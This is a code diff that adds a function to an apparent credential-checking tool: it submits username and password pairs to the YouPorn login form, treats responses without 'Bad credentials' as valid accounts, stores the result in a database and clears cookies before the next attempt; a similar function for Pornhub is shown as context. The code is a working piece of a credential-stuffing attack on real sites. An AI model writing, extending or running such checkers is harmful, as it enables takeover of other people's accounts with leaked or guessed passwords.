@@ -22,6 +22,26 @@ import logging as log
 #     print(res.content)
 #
 
+def youporn(usr,pwd,mr):
+    mr : ManageRequests
+    post_url = "https://www.youporn.com/login/"
+    # Post request to login
+    res = mr.post_with_checks(post_url,
+                              data={'login[username]': usr,
+                                    'login[password]': pwd,
+                                    'login[previous]': '',
+                                    'login[logical_data': '{}',
+                                    })
+    if "Bad credentials" in str(res.text):
+        mr.db.update_result(usr, pwd, "youporn", "False")
+        log.info("Account error {} {}".format(usr, pwd))
+    else:
+        mr.db.update_result(usr, pwd, "youporn", "True")
+        log.info("Account valid {}".format(usr))
+    log.info("-------------------------------")
+    mr.req.cookies.clear()
+
+
 def pornhub(usr, pwd, mr):
     mr : ManageRequests
     post_url = "https://www.pornhub.com/front/authenticate"
